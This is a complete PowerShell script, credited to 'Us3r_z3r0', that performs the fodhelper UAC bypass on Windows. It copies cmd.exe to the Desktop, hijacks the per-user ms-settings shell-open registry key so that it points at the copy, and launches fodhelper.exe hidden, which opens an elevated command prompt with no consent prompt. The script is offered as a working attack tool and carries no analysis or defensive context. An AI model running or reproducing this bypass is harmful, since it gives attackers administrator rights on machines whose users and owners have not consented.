
Write-Host "[+] Coded By Us3r_z3r0"
Write-Host "[+] Bypassing UAC"

copy C:\Windows\System32\cmd.exe $env:USERPROFILE\Desktop\12.exe
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $env:USERPROFILE\Desktop\12.exe
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden